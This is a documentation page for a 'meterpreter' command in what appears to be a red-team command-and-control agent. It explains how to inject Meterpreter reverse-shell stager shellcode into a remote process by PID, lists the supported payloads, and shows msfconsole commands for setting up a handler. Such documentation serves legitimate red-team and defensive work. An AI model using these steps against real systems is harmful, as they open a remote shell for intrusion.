+++
title = "meterpreter"
chapter = false
weight = 103
hidden = true
+++

## Summary
Author: [@reznok](https://twitter.com/rezn0k)

Inject meterpreter stager shellcode into a remote process.

Supports the following payloads:

```
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_http
windows/x64/meterpreter/reverse_https
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_http
windows/meterpreter/reverse_https
```


### Arguments (Popup)
#### PID
Target process ID to inject into.

#### Payload Type
Which stager payload to use (reverse_tcp, reverse_http, reverse_https)

#### Architecture
Architecture type to use for payload (x86, x64)

#### LHOST
The IP address of the listening meterpreter handler

#### LPORT
The port of the listening meterpreter handler



## Usage
```
meterpreter
```
Opens a modal

In pop up model:
```
PID: [pid]
Payload Type: [Meterpreter Payload Type Dropdown]
Architecture: [Architecture Dropdown]
LHOST: [Listening Host IP]
LPORT: [Listening Host Port]

```

Example
```
meterpreter
```
In pop up menu
```
pid: 1234
Payload Type: reverse_tcp
Architecture: x64
LHOST: 127.0.0.1
LPORT: 4444
```


Requires a remote metasploit handler to catch the stagers.

Example
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <host>
set LPORT <port>
run
```

## Detailed Usage
The `meterpreter` command will use the agent's current injection technique to inject the given shellcode into a remote process.
